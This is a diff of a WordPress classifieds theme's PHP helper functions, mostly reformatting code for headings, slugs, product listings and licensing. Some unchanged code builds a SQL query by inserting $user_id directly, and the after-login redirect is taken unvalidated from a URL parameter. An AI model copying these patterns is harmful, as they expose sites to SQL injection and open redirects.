-            } else if (is_search()) {
-                $string = esc_html__('entire web', 'adforest');
-                if (get_search_query() != "") {
-                    $string = get_search_query();
-                }
-                $page_heading = sprintf(esc_html__('Search Results for: %s', 'adforest'), esc_html($string));
-            } else if (is_category()) {
-                $page_heading = esc_html(single_cat_title("", false));
-            } else if (is_tag()) {
-                $page_heading = esc_html__('Tag: ', 'adforest') . esc_html(single_tag_title("", false));
-            } else if (is_404()) {
-                $page_heading = esc_html__('Page not found', 'adforest');
-            } else if (is_author()) {
-                $author_id = get_query_var('author');
-                $author = get_user_by('ID', $author_id);
-                $page_heading = $author->display_name;
-            } else if (is_tax()) {
-                $page_heading = esc_html(single_cat_title("", false));
-            } else if (is_archive()) {
-                $page_heading = __('Blog Archive', 'adforest');
-            } else if (is_home()) {
-                $page_heading = esc_html__('Latest Stories', 'adforest');
-            } else if (is_singular('post')) {
-                if (isset($adforest_theme['sb_blog_single_title']) && $adforest_theme['sb_blog_single_title'] != "") {
-                    $page_heading = $adforest_theme['sb_blog_single_title'];
-                } else {
-                    $page_heading = __('Blog Detail', 'adforest');
-                }
-            } else if (is_singular('page')) {
-                $page_heading = get_the_title();
-            } else if (is_singular('ad_post')) {
-                if (isset($adforest_theme['sb_single_ad_text']) && $adforest_theme['sb_single_ad_text'] != "")
-                    $page_heading = $adforest_theme['sb_single_ad_text'];
-                else
-                    $page_heading = __('Ad Detail', 'adforest');
-            }
-            return $page_heading;
-        }
-
-    }
-    /* Translation */
-    if (!function_exists('adforest_translate')) {
-
-        function adforest_translate($index) {
-            $strings = array(
-                'variation_not_available' => __('This product is currently out of stock and unavailable.', 'adforest'),
-                'adding_to_cart' => __('Adding...', 'adforest'),
-                'add_to_cart' => __('add to cart', 'adforest'),
-                'view_cart' => __('View Cart', 'adforest'),
-                'cart_success_msg' => __('Product Added successfully.', 'adforest'),
-                'cart_success' => __('Success', 'adforest'),
-                'cart_error_msg' => __('Something went wrong, please try it again.', 'adforest'),
-                'cart_error' => __('Error', 'adforest'),
-                'email_error_msg' => __('Please add valid email.', 'adforest'),
-                'mc_success_msg' => __('Thank you, we will get back to you.', 'adforest'),
-                'mc_error_msg' => __('There is some error, please check your API-KEY and LIST-ID.', 'adforest'),
-            );
-            return $strings[$index];
-        }
-
-    }
-    if (!function_exists('adforest_title_limit')) {
-        function adforest_title_limit($ad_title = '') {
-            global $adforest_theme;
-            if (isset($adforest_theme['sb_ad_title_limit_on']) && $adforest_theme['sb_ad_title_limit_on'] && isset($adforest_theme['sb_ad_title_limit']) && $adforest_theme['sb_ad_title_limit'] != "") {
-                return adforest_words_count($ad_title, $adforest_theme['sb_ad_title_limit']);
+            $page_heading = sprintf(esc_html__('Search Results for: %s', 'adforest'), esc_html($string));
+        } else if (is_category()) {
+            $page_heading = esc_html(single_cat_title("", false));
+        } else if (is_tag()) {
+            $page_heading = esc_html__('Tag: ', 'adforest') . esc_html(single_tag_title("", false));
+        } else if (is_404()) {
+            $page_heading = esc_html__('Page not found', 'adforest');
+        } else if (is_author()) {
+            $author_id = get_query_var('author');
+            $author = get_user_by('ID', $author_id);
+            $page_heading = $author->display_name;
+        } else if (is_tax()) {
+            $page_heading = esc_html(single_cat_title("", false));
+        } else if (is_archive()) {
+            $page_heading = __('Blog Archive', 'adforest');
+        } else if (is_home()) {
+            $page_heading = esc_html__('Latest Stories', 'adforest');
+        } else if (is_singular('post')) {
+            if (isset($adforest_theme['sb_blog_single_title']) && $adforest_theme['sb_blog_single_title'] != "") {
+                $page_heading = $adforest_theme['sb_blog_single_title'];
             } else {
-                return $ad_title;
+                $page_heading = __('Blog Detail', 'adforest');
             }
+        } else if (is_singular('page')) {
+            $page_heading = get_the_title();
+        } else if (is_singular('ad_post')) {
+            if (isset($adforest_theme['sb_single_ad_text']) && $adforest_theme['sb_single_ad_text'] != "")
+                $page_heading = $adforest_theme['sb_single_ad_text'];
+            else
+                $page_heading = __('Ad Detail', 'adforest');
         }
-    }
-    add_filter('register_post_type_args', 'adforest_register_post_type_args', 10, 2);
-    if (!function_exists('adforest_register_post_type_args')) {
-        function adforest_register_post_type_args($args, $post_type) {
-            $adforest_theme_values = get_option('adforest_theme');
-            if (isset($adforest_theme_values['sb_url_rewriting_enable']) && $adforest_theme_values['sb_url_rewriting_enable'] && isset($adforest_theme_values['sb_ad_slug']) && $adforest_theme_values['sb_ad_slug'] != "") {
-                if ('ad_post' === $post_type) {
-                    $old_slug = 'ad';
-                    if (get_option('sb_ad_old_slug') != "") {
-                        $old_slug = get_option('sb_ad_old_slug');
-                    }
-                    $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_slug'];
-                    update_option('sb_ad_old_slug', $adforest_theme_values['sb_ad_slug']);
-                    if (($current_rules = get_option('rewrite_rules'))) {
-                        foreach ($current_rules as $key => $val) {
-                            if (strpos($key, $old_slug) !== false) {
-                                add_rewrite_rule(str_ireplace($old_slug, $adforest_theme_values['sb_ad_slug'], $key), $val, 'top');
-                            }
-                        }
-                        flush_rewrite_rules();
-                    }
-                }
-            }
-            return $args;
-        }
-
+        return $page_heading;
     }
 
-    if (!function_exists('adforest_change_taxonomies_slug')) {
-        function adforest_change_taxonomies_slug($args, $taxonomy) {
-            /* item category */
-            $adforest_theme_values = get_option('adforest_theme');
-            if (isset($adforest_theme_values['sb_url_rewriting_enable_cat']) && $adforest_theme_values['sb_url_rewriting_enable_cat'] && isset($adforest_theme_values['sb_cat_slug']) && $adforest_theme_values['sb_cat_slug'] != "") {
-                if ('ad_cats' === $taxonomy) {
-                    $args['rewrite']['slug'] = $adforest_theme_values['sb_cat_slug'];
-                }
-            }
-            if (isset($adforest_theme_values['sb_url_rewriting_enable_location']) && $adforest_theme_values['sb_url_rewriting_enable_location'] && isset($adforest_theme_values['sb_ad_location_slug']) && $adforest_theme_values['sb_ad_location_slug'] != "") {
-                if ('ad_country' === $taxonomy) {
-                    $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_location_slug'];
-                }
-            }
-            if (isset($adforest_theme_values['sb_url_rewriting_enable_ad_tags']) && $adforest_theme_values['sb_url_rewriting_enable_ad_tags'] && isset($adforest_theme_values['sb_ad_tags_slug']) && $adforest_theme_values['sb_ad_tags_slug'] != "") {
-                if ('ad_tags' === $taxonomy) {
-                    $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_tags_slug'];
-                }
-            }
-            return $args;
-        }
+}
+/* Translation */
+if (!function_exists('adforest_translate')) {
 
-    }
-    add_filter('register_taxonomy_args', 'adforest_change_taxonomies_slug', 10, 2);
-    if (!function_exists('adforest_display_adLocation')) {
-        function adforest_display_adLocation($pid) {
-            global $adforest_theme;
-            $ad_country = '';
-            $type = '';
-            $type = $adforest_theme['cat_and_location'];
-            $ad_country = wp_get_object_terms($pid, array('ad_country'), array('orderby' => 'term_group'));
-            $all_locations = array();
-            foreach ($ad_country as $ad_count) {
-                $country_ads = get_term($ad_count);
-                $item = array(
-                    'term_id' => $country_ads->term_id,
-                    'location' => $country_ads->name
-                );
-                $all_locations[] = $item;
-            }
-            $location_html = '';
-            if (count($all_locations) > 0) {
-                $limit = count($all_locations) - 1;
-                for ($i = $limit; $i >= 0; $i--) {
-                    if ($type == 'search') {
-                        $sb_search_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_search_page']);
-                        $location_html .= '<a href="' . get_the_permalink($sb_search_page) . '?country_id=' . $all_locations[$i]['term_id'] . '">' . esc_html($all_locations[$i]['location']) . '</a>, ';
-                    } else {
-                        $location_html .= '<a href="' . get_term_link($all_locations[$i]['term_id']) . '">' . esc_html($all_locations[$i]['location']) . '</a>, ';
-                    }
-                }
-            }
-            return rtrim($location_html, ', ');
-        }
-    }
-    if (!function_exists('adforest_dynamic_field_type_template')) {
-        function adforest_dynamic_field_type_template($term_id = '') {
-            $template_id = adforest_dynamic_templateID($term_id);
-            $result = get_term_meta($template_id, '_sb_dynamic_form_fields', true);
-            $template_array = sb_dynamic_form_data($result);
-            return $template_array;
-        }
-
+    function adforest_translate($index)
+    {
+        $strings = array(
+            'variation_not_available' => __('This product is currently out of stock and unavailable.', 'adforest'),
+            'adding_to_cart' => __('Adding...', 'adforest'),
+            'add_to_cart' => __('add to cart', 'adforest'),
+            'view_cart' => __('View Cart', 'adforest'),
+            'cart_success_msg' => __('Product Added successfully.', 'adforest'),
+            'cart_success' => __('Success', 'adforest'),
+            'cart_error_msg' => __('Something went wrong, please try it again.', 'adforest'),
+            'cart_error' => __('Error', 'adforest'),
+            'email_error_msg' => __('Please add valid email.', 'adforest'),
+            'mc_success_msg' => __('Thank you, we will get back to you.', 'adforest'),
+            'mc_error_msg' => __('There is some error, please check your API-KEY and LIST-ID.', 'adforest'),
+        );
+        return $strings[ $index ];
     }
 
-    if (!function_exists('adforest_dynamic_field_type')) {
-        function adforest_dynamic_field_type($template_array = '', $slug = '') {
-            $field_type = '';
-            if (isset($template_array) && count($template_array) > 0) {
-                foreach ($template_array as $ct) {
-                    if ($ct['slugs'] == $slug) {
-                        if ($ct['types'] == 1) {
-                            $field_type = 'input';
-                        } else if ($ct['types'] == 2) {
-                            $field_type = 'select';
-                        } else if ($ct['types'] == 3 || $ct['types'] == 9) {
-                            $field_type = 'checkbox';
-                        } else if ($ct['types'] == 4) {
-                            $field_type = 'date';
-                        } else if ($ct['types'] == 5) {
-                            $field_type = 'url';
-                        } else if ($ct['types'] == 6) {
-                            $field_type = 'number';
-                        } else if ($ct['types'] == 7) {
-                            $field_type = 'radio';
+}
+if (!function_exists('adforest_title_limit')) {
+    function adforest_title_limit($ad_title = '')
+    {
+        global $adforest_theme;
+        if (isset($adforest_theme['sb_ad_title_limit_on']) && $adforest_theme['sb_ad_title_limit_on'] && isset($adforest_theme['sb_ad_title_limit']) && $adforest_theme['sb_ad_title_limit'] != "") {
+            return adforest_words_count($ad_title, $adforest_theme['sb_ad_title_limit']);
+        } else {
+            return $ad_title;
+        }
+    }
+}
+add_filter('register_post_type_args', 'adforest_register_post_type_args', 10, 2);
+if (!function_exists('adforest_register_post_type_args')) {
+    function adforest_register_post_type_args($args, $post_type)
+    {
+        $adforest_theme_values = get_option('adforest_theme');
+        if (isset($adforest_theme_values['sb_url_rewriting_enable']) && $adforest_theme_values['sb_url_rewriting_enable'] && isset($adforest_theme_values['sb_ad_slug']) && $adforest_theme_values['sb_ad_slug'] != "") {
+            if ('ad_post' === $post_type) {
+                $old_slug = 'ad';
+                if (get_option('sb_ad_old_slug') != "") {
+                    $old_slug = get_option('sb_ad_old_slug');
+                }
+                $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_slug'];
+                update_option('sb_ad_old_slug', $adforest_theme_values['sb_ad_slug']);
+                if (($current_rules = get_option('rewrite_rules'))) {
+                    foreach ($current_rules as $key => $val) {
+                        if (strpos($key, $old_slug) !== false) {
+                            add_rewrite_rule(str_ireplace($old_slug, $adforest_theme_values['sb_ad_slug'], $key), $val, 'top');
                         }
                     }
+                    flush_rewrite_rules();
                 }
             }
-            return $field_type;
         }
+        return $args;
+    }
 
-    }
-    if (!function_exists('adforest_validateDateFormat')) {
-        function adforest_validateDateFormat($date, $format = 'Y-m-d') {
-            $d = DateTime::createFromFormat($format, $date);
-            // The Y ( 4 digits year ) returns TRUE for any integer with any number of digits so changing the comparison from == to === fixes the issue.
-            return $d && $d->format($format) === $date;
-        }
-    }
-    if (!function_exists('adforest_sample_admin_notice_activate')) {
-        function adforest_sample_admin_notice_activate() {
-            if (get_option('_sb_purchase_code') != "") {
-                return;
+}
+
+if (!function_exists('adforest_change_taxonomies_slug')) {
+    function adforest_change_taxonomies_slug($args, $taxonomy)
+    {
+        /* item category */
+        $adforest_theme_values = get_option('adforest_theme');
+        if (isset($adforest_theme_values['sb_url_rewriting_enable_cat']) && $adforest_theme_values['sb_url_rewriting_enable_cat'] && isset($adforest_theme_values['sb_cat_slug']) && $adforest_theme_values['sb_cat_slug'] != "") {
+            if ('ad_cats' === $taxonomy) {
+                $args['rewrite']['slug'] = $adforest_theme_values['sb_cat_slug'];
             }
-            ?>
+        }
+        if (isset($adforest_theme_values['sb_url_rewriting_enable_location']) && $adforest_theme_values['sb_url_rewriting_enable_location'] && isset($adforest_theme_values['sb_ad_location_slug']) && $adforest_theme_values['sb_ad_location_slug'] != "") {
+            if ('ad_country' === $taxonomy) {
+                $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_location_slug'];
+            }
+        }
+        if (isset($adforest_theme_values['sb_url_rewriting_enable_ad_tags']) && $adforest_theme_values['sb_url_rewriting_enable_ad_tags'] && isset($adforest_theme_values['sb_ad_tags_slug']) && $adforest_theme_values['sb_ad_tags_slug'] != "") {
+            if ('ad_tags' === $taxonomy) {
+                $args['rewrite']['slug'] = $adforest_theme_values['sb_ad_tags_slug'];
+            }
+        }
+        return $args;
+    }
+
+}
+add_filter('register_taxonomy_args', 'adforest_change_taxonomies_slug', 10, 2);
+if (!function_exists('adforest_display_adLocation')) {
+    function adforest_display_adLocation($pid)
+    {
+        global $adforest_theme;
+        $ad_country = '';
+        $type = '';
+        $type = $adforest_theme['cat_and_location'];
+        $ad_country = wp_get_object_terms($pid, array('ad_country'), array('orderby' => 'term_group'));
+        $all_locations = array();
+        foreach ($ad_country as $ad_count) {
+            $country_ads = get_term($ad_count);
+            $item = array(
+                'term_id' => $country_ads->term_id,
+                'location' => $country_ads->name
+            );
+            $all_locations[] = $item;
+        }
+        $location_html = '';
+        if (count($all_locations) > 0) {
+            $limit = count($all_locations) - 1;
+            for ($i = $limit; $i >= 0; $i--) {
+                if ($type == 'search') {
+                    $sb_search_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_search_page']);
+                    $location_html .= '<a href="' . get_the_permalink($sb_search_page) . '?country_id=' . $all_locations[ $i ]['term_id'] . '">' . esc_html($all_locations[ $i ]['location']) . '</a>, ';
+                } else {
+                    $location_html .= '<a href="' . get_term_link($all_locations[ $i ]['term_id']) . '">' . esc_html($all_locations[ $i ]['location']) . '</a>, ';
+                }
+            }
+        }
+        return rtrim($location_html, ', ');
+    }
+}
+if (!function_exists('adforest_dynamic_field_type_template')) {
+    function adforest_dynamic_field_type_template($term_id = '')
+    {
+        $template_id = adforest_dynamic_templateID($term_id);
+        $result = get_term_meta($template_id, '_sb_dynamic_form_fields', true);
+        $template_array = sb_dynamic_form_data($result);
+        return $template_array;
+    }
+
+}
+
+if (!function_exists('adforest_dynamic_field_type')) {
+    function adforest_dynamic_field_type($template_array = '', $slug = '')
+    {
+        $field_type = '';
+        if (isset($template_array) && count($template_array) > 0) {
+            foreach ($template_array as $ct) {
+                if ($ct['slugs'] == $slug) {
+                    if ($ct['types'] == 1) {
+                        $field_type = 'input';
+                    } else if ($ct['types'] == 2) {
+                        $field_type = 'select';
+                    } else if ($ct['types'] == 3 || $ct['types'] == 9) {
+                        $field_type = 'checkbox';
+                    } else if ($ct['types'] == 4) {
+                        $field_type = 'date';
+                    } else if ($ct['types'] == 5) {
+                        $field_type = 'url';
+                    } else if ($ct['types'] == 6) {
+                        $field_type = 'number';
+                    } else if ($ct['types'] == 7) {
+                        $field_type = 'radio';
+                    }
+                }
+            }
+        }
+        return $field_type;
+    }
+
+}
+if (!function_exists('adforest_validateDateFormat')) {
+    function adforest_validateDateFormat($date, $format = 'Y-m-d')
+    {
+        $d = DateTime::createFromFormat($format, $date);
+        // The Y ( 4 digits year ) returns TRUE for any integer with any number of digits so changing the comparison from == to === fixes the issue.
+        return $d && $d->format($format) === $date;
+    }
+}
+if (!function_exists('adforest_sample_admin_notice_activate')) {
+    function adforest_sample_admin_notice_activate()
+    {
+        if (get_option('_sb_purchase_code') != "") {
+            return;
+        }
+        ?>
             <div class="notice notice-error is-dismissible">
                 <h4><?php echo __('Attention!', 'adforest'); ?></h4>
                 <p><?php echo __('Please Verify your PURCHASE code in order to work this theme.', 'adforest'); ?></p>
@@ -3337,136 +3554,140 @@ if (!function_exists('adforest_comments_list')) {
                 </p>
             </div>
             <?php
-        }
-
     }
 
+}
 
-    add_action('admin_notices', 'adforest_sample_admin_notice_activate');
-    if (!function_exists('adforest_randomString')) {
-        function adforest_randomString($length = 50) {
-            $str = "";
-            $characters = array_merge(range('A', 'Z'), range('a', 'z'), range('0', '9'));
-            $max = count($characters) - 1;
-            for ($i = 0; $i < $length; $i++) {
-                $rand = mt_rand(0, $max);
-                $str .= $characters[$rand];
-            }
-            return $str;
-        }
 
-    }
-    add_action('wp_ajax_sb_deactivate_license', 'sb_deactivate_license_func');
-    if (!function_exists('sb_deactivate_license_func')) {
-        function sb_deactivate_license_func() {
-            $purchase_code = get_option('_sb_purchase_code');
-            if ($purchase_code != "") {
-                update_option('_sb_purchase_code', "");
-                echo esc_html__('License Deactivated', 'adforest');
-                die();
-            }
+add_action('admin_notices', 'adforest_sample_admin_notice_activate');
+if (!function_exists('adforest_randomString')) {
+    function adforest_randomString($length = 50)
+    {
+        $str = "";
+        $characters = array_merge(range('A', 'Z'), range('a', 'z'), range('0', '9'));
+        $max = count($characters) - 1;
+        for ($i = 0; $i < $length; $i++) {
+            $rand = mt_rand(0, $max);
+            $str .= $characters[ $rand ];
         }
+        return $str;
     }
 
-    if (!function_exists('adforest_get_adVideoID')) {
-        function adforest_get_adVideoID($video_url = '') {
-            $vid_arr = array();
-            $ad_video = $video_url;
-            preg_match('%(?:youtube(?:-nocookie)?\.com/(?:[^/]+/.+/|(?:v|e(?:mbed)?)/|.*[?&]v=)|youtu\.be/)([^"&?/ ]{11})%i', $ad_video, $match);
-            return $vID = (isset($match[1]) && $match[1] != "") ? $match[1] : '';
+}
+add_action('wp_ajax_sb_deactivate_license', 'sb_deactivate_license_func');
+if (!function_exists('sb_deactivate_license_func')) {
+    function sb_deactivate_license_func()
+    {
+        $purchase_code = get_option('_sb_purchase_code');
+        if ($purchase_code != "") {
+            update_option('_sb_purchase_code', "");
+            echo esc_html__('License Deactivated', 'adforest');
+            die();
         }
     }
-    
-    if (!function_exists('get_products_by_category')) {
+}
 
-        function get_products_by_category($categ_id_slug = '', $max_limit = 4, $product_fetch_type = 'slug') {
-            global $adforest_theme;
-            $prod_html = $sale_price = $regular_price = '';
-            if ($categ_id_slug == '') {
-                $loop_args = array('post_type' => 'product', 'posts_per_page' => $max_limit, 'order' => 'DESC',);
-            } else {
-                $categories = array(
-                    array(
-                        'taxonomy' => 'product_cat',
-                        'field' => $product_fetch_type,
-                        'terms' => $categ_id_slug,
-                    ),
-                );
-                $loop_args = array(
-                    'post_type' => 'product',
-                    'post_status' => 'publish',
-                    'posts_per_page' => $max_limit,
-                    'tax_query' => array(
-                        $categories,
-                    ),
-                );
-                $args = apply_filters('adforest_wpml_show_all_posts', $loop_args);
-                $results = new WP_Query($args);
-                if ($results->have_posts()) {
-                    while ($results->have_posts()) {
-                        $results->the_post();
-                        $product_id = get_the_ID();
-                        global $product;
-                        $currency = get_woocommerce_currency_symbol();
-                        $price = $product->get_regular_price();
-                        $sale = $product->get_sale_price();
-                        $newness_days = isset($adforest_theme['shop_newness_product_days']) ? $adforest_theme['shop_newness_product_days'] : 30;
-                        $created = strtotime($product->get_date_created());
-                        $new_badge_html = '';
-                        /* here we use static badge date. */
-                        if ((time() - (60 * 60 * 24 * $newness_days)) < $created) {
-                            $new_html = '<span class="new-product">' . esc_html__('new', 'adforest') . '</span>';
-                        }
-                        $prod_image_src = wp_get_attachment_image_src(get_post_thumbnail_id($product_id), 'woocommerce_thumbnail');
-                        $prod_img_html = '';
-                        if (isset($prod_image_src) && is_array($prod_image_src)) {
-                            $prod_img_html = '<a href="' . get_the_permalink($product_id) . '"><img src="' . $prod_image_src[0] . '" alt="' . get_the_title($product_id) . '" class="img-fluid"/></a>';
-                        } else {
-                            $prod_img_html = '<a href="' . get_the_permalink($product_id) . '"><img class="img-fluid" alt="' . get_the_title() . '" src="' . esc_url(wc_placeholder_img_src('woocommerce_thumbnail')) . '"></a>';
-                        }
+if (!function_exists('adforest_get_adVideoID')) {
+    function adforest_get_adVideoID($video_url = '')
+    {
+        $vid_arr = array();
+        $ad_video = $video_url;
+        preg_match('%(?:youtube(?:-nocookie)?\.com/(?:[^/]+/.+/|(?:v|e(?:mbed)?)/|.*[?&]v=)|youtu\.be/)([^"&?/ ]{11})%i', $ad_video, $match);
+        return $vID = (isset($match[1]) && $match[1] != "") ? $match[1] : '';
+    }
+}
 
-                        $price_html = '<h5>' . esc_html(adforest_shopPriceDirection($price, $currency)) . '</h5>';
-                        $sale_html = "";
+if (!function_exists('get_products_by_category')) {
 
-                        $new_space = '';
-                        if ($sale) {
-                            $price_html = '<h5>' . esc_html(adforest_shopPriceDirection($sale, $currency)) . '<span class="del">' . esc_html(adforest_shopPriceDirection($price, $currency)) . '</span></h5>';
-                            $sale_html = '<span class="sale-shop">' . esc_html__('sale', 'adforest') . '</span>';
-                            $new_space = "new_top";
-                        }
-                        $new_html = "";
-                        if ((time() - (60 * 60 * 24 * $newness_days)) < $created) {
-                            $new_html = '<span class="new-product ' . $new_space . '">' . esc_html__('new', 'adforest') . '</span>';
-                        }
+    function get_products_by_category($categ_id_slug = '', $max_limit = 4, $product_fetch_type = 'slug')
+    {
+        global $adforest_theme;
+        $prod_html = $sale_price = $regular_price = '';
+        if ($categ_id_slug == '') {
+            $loop_args = array('post_type' => 'product', 'posts_per_page' => $max_limit, 'order' => 'DESC', );
+        } else {
+            $categories = array(
+                array(
+                    'taxonomy' => 'product_cat',
+                    'field' => $product_fetch_type,
+                    'terms' => $categ_id_slug,
+                ),
+            );
+            $loop_args = array(
+                'post_type' => 'product',
+                'post_status' => 'publish',
+                'posts_per_page' => $max_limit,
+                'tax_query' => array(
+                    $categories,
+                ),
+            );
+            $args = apply_filters('adforest_wpml_show_all_posts', $loop_args);
+            $results = new WP_Query($args);
+            if ($results->have_posts()) {
+                while ($results->have_posts()) {
+                    $results->the_post();
+                    $product_id = get_the_ID();
+                    global $product;
+                    $currency = get_woocommerce_currency_symbol();
+                    $price = $product->get_regular_price();
+                    $sale = $product->get_sale_price();
+                    $newness_days = isset($adforest_theme['shop_newness_product_days']) ? $adforest_theme['shop_newness_product_days'] : 30;
+                    $created = strtotime($product->get_date_created());
+                    $new_badge_html = '';
+                    /* here we use static badge date. */
+                    if ((time() - (60 * 60 * 24 * $newness_days)) < $created) {
+                        $new_html = '<span class="new-product">' . esc_html__('new', 'adforest') . '</span>';
+                    }
+                    $prod_image_src = wp_get_attachment_image_src(get_post_thumbnail_id($product_id), 'woocommerce_thumbnail');
+                    $prod_img_html = '';
+                    if (isset($prod_image_src) && is_array($prod_image_src)) {
+                        $prod_img_html = '<a href="' . get_the_permalink($product_id) . '"><img src="' . $prod_image_src[0] . '" alt="' . get_the_title($product_id) . '" class="img-fluid"/></a>';
+                    } else {
+                        $prod_img_html = '<a href="' . get_the_permalink($product_id) . '"><img class="img-fluid" alt="' . get_the_title() . '" src="' . esc_url(wc_placeholder_img_src('woocommerce_thumbnail')) . '"></a>';
+                    }
+
+                    $price_html = '<h5>' . esc_html(adforest_shopPriceDirection($price, $currency)) . '</h5>';
+                    $sale_html = "";
+
+                    $new_space = '';
+                    if ($sale) {
+                        $price_html = '<h5>' . esc_html(adforest_shopPriceDirection($sale, $currency)) . '<span class="del">' . esc_html(adforest_shopPriceDirection($price, $currency)) . '</span></h5>';
+                        $sale_html = '<span class="sale-shop">' . esc_html__('sale', 'adforest') . '</span>';
+                        $new_space = "new_top";
+                    }
+                    $new_html = "";
+                    if ((time() - (60 * 60 * 24 * $newness_days)) < $created) {
+                        $new_html = '<span class="new-product ' . $new_space . '">' . esc_html__('new', 'adforest') . '</span>';
+                    }
 
 
 
 
-                        $rating_html = "";
-                        $no_rating_class = "not-rated-product";
-                        if ($product->get_average_rating() > 0) {
-                            $rating_html = '<div class="listing-ratings">
+                    $rating_html = "";
+                    $no_rating_class = "not-rated-product";
+                    if ($product->get_average_rating() > 0) {
+                        $rating_html = '<div class="listing-ratings">
                                                 <div class="woocommerce-product-rating">' . wc_get_rating_html($product->get_average_rating()) . '  
                                                     <span class="product-review-count">' . $product->get_review_count() . '&nbsp' . esc_html__('Reviews', 'adforest') . '</span>
                                                 </div>
 
                                             </div>';
 
-                            $no_rating_class = "";
-                        }
+                        $no_rating_class = "";
+                    }
 
 
 
-                        /* check already favourite or not */
-                        $fav_class = '';
+                    /* check already favourite or not */
+                    $fav_class = '';
+                    $heart_filled = 'fa-heart';
+                    if (get_user_meta(get_current_user_id(), '_product_fav_id_' . $product_id, true) == $product_id) {
+                        $fav_class = 'favourited';
                         $heart_filled = 'fa-heart';
-                        if (get_user_meta(get_current_user_id(), '_product_fav_id_' . $product_id, true) == $product_id) {
-                            $fav_class = 'favourited';
-                            $heart_filled = 'fa-heart';
-                        }
-                        $prod_html .= '<div class="wrapper-latest-product woocommerce  ' . $no_rating_class . ' ">
+                    }
+                    $prod_html .= '<div class="wrapper-latest-product woocommerce  ' . $no_rating_class . ' ">
                                                 <div class="top-product-img">
-                                                  <a href="'.get_the_permalink() .'">
+                                                  <a href="' . get_the_permalink() . '">
                                                      ' . $prod_img_html . '
                                                      </a>
                                                 </div>
@@ -3488,255 +3709,261 @@ if (!function_exists('adforest_comments_list')) {
                                               ' . $sale_html . '
                                                   ' . $new_html . '
                                           </div>';
-                    }
-                    wp_reset_postdata();
                 }
-                return $prod_html;
+                wp_reset_postdata();
             }
+            return $prod_html;
         }
-
-    }
-    /* ============================== */
-    /* Getting candiates job alerts */
-    /* =============================== */
-    if (!function_exists('sb_get_ad_alerts')) {
-
-        function sb_get_ad_alerts($user_id = '') {
-            global $wpdb;
-            /* Query For Getting All Resumes Against Job */
-            $query = "SELECT meta_key, meta_value FROM $wpdb->usermeta WHERE user_id = '$user_id' AND meta_key like '_cand_alerts_$user_id%' ";
-            $resumes = $wpdb->get_results($query);
-            $data = array();
-            foreach ($resumes as $resume) {
-                $value = json_decode($resume->meta_value, true);
-                $data["$resume->meta_key"] = $value;
-            }
-            return $data;
-        }
-
     }
 
-    if (!function_exists('adforestTheme_delete_userComments')) {
+}
+/* ============================== */
+/* Getting candiates job alerts */
+/* =============================== */
+if (!function_exists('sb_get_ad_alerts')) {
 
-        function adforestTheme_delete_userComments($user_id) {
-            $user = get_user_by('id', $user_id);
-
-            $comments = get_comments('author_email=' . $user->user_email);
-            foreach ($comments as $comment) :
-                wp_delete_comment($comment->$comment_id, true);
-            endforeach;
-
-            $comments = get_comments('user_id=' . $user_id);
-            foreach ($comments as $comment) :
-                wp_delete_comment($comment->$comment_id, true);
-            endforeach;
+    function sb_get_ad_alerts($user_id = '')
+    {
+        global $wpdb;
+        /* Query For Getting All Resumes Against Job */
+        $query = "SELECT meta_key, meta_value FROM $wpdb->usermeta WHERE user_id = '$user_id' AND meta_key like '_cand_alerts_$user_id%' ";
+        $resumes = $wpdb->get_results($query);
+        $data = array();
+        foreach ($resumes as $resume) {
+            $value = json_decode($resume->meta_value, true);
+            $data[ "$resume->meta_key" ] = $value;
         }
-
-    }
-    if (!function_exists('adforest_user_id_exists')) {
-
-        function adforest_user_id_exists($user) {
-            global $wpdb;
-            $count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $wpdb->users WHERE ID = %d", $user));
-
-            if ($count == 1) {
-                return true;
-            } else {
-                return false;
-            }
-        }
-
+        return $data;
     }
 
+}
 
-    add_filter('adforest_get_static_string', 'adforest_get_static_string_fun', 10, 3);
+if (!function_exists('adforestTheme_delete_userComments')) {
 
-    if (!function_exists('adforest_get_static_string_fun')) {
+    function adforestTheme_delete_userComments($user_id)
+    {
+        $user = get_user_by('id', $user_id);
 
-        function adforest_get_static_string_fun() {
-            global $adforest_theme, $wpdb;
-            $ajax_url = apply_filters('adforest_set_query_param', admin_url('admin-ajax.php'));
-            $mapType = adforest_mapType();
+        $comments = get_comments('author_email=' . $user->user_email);
+        foreach ($comments as $comment):
+            wp_delete_comment($comment->$comment_id, true);
+        endforeach;
 
-            $user_id = get_current_user_id();
-
-            $is_logged_in = 0;
-            if (is_user_logged_in()) {
-                $is_logged_in = 1;
-            }
-            $sb_packages_page = apply_filters('adforest_language_page_id', $adforest_theme['sb_packages_page']);
-            $sb_profile_page = apply_filters('adforest_language_page_id', isset($adforest_theme['sb_profile_page']) ? $adforest_theme['sb_profile_page'] : "");
-
-
-            
-
-           $sb_after_login_page = isset($adforest_theme['sb_after_login_page']) && $adforest_theme['sb_after_login_page'] != '' ? $adforest_theme['sb_after_login_page'] : $sb_profile_page;
-
-
-
-
-           $sb_after_login_page = apply_filters('adforest_language_page_id', $sb_after_login_page);
-
-            $sb_profile_page   =  get_the_permalink($sb_profile_page);
-
-
-            $sb_after_login_page = get_the_permalink($sb_after_login_page);
-            if (isset($_GET['u']) && $_GET['u'] != "") {
-                $sb_after_login_page = $_GET['u'];
-            }
-            $sb_2column = (isset($adforest_theme['sb_2column_mobile_layout']) && $adforest_theme['sb_2column_mobile_layout'] == true) ? true : false;
-
-            $tags_limit_val = isset($adforest_theme['ad_post_tags_limit']) && !empty($adforest_theme['ad_post_tags_limit']) && $adforest_theme['ad_post_tags_limit'] > 0 ? $adforest_theme['ad_post_tags_limit'] : 10;
-
-            $sb_upload_limit_admin = isset($adforest_theme['sb_upload_limit']) && !empty($adforest_theme['sb_upload_limit']) && $adforest_theme['sb_upload_limit'] > 0 ? $adforest_theme['sb_upload_limit'] : 0;
-
-            $user_packages_images = get_user_meta(get_current_user_id(), '_sb_num_of_images', true);
-            //$user_upload_max_images = isset($user_packages_images) && !empty($user_packages_images) ? $user_packages_images : $sb_upload_limit_admin;
-
-            if (isset($user_packages_images) && $user_packages_images == '-1') {
-                $user_upload_max_images = 'null';
-            } elseif (isset($user_packages_images) && $user_packages_images > 0) {
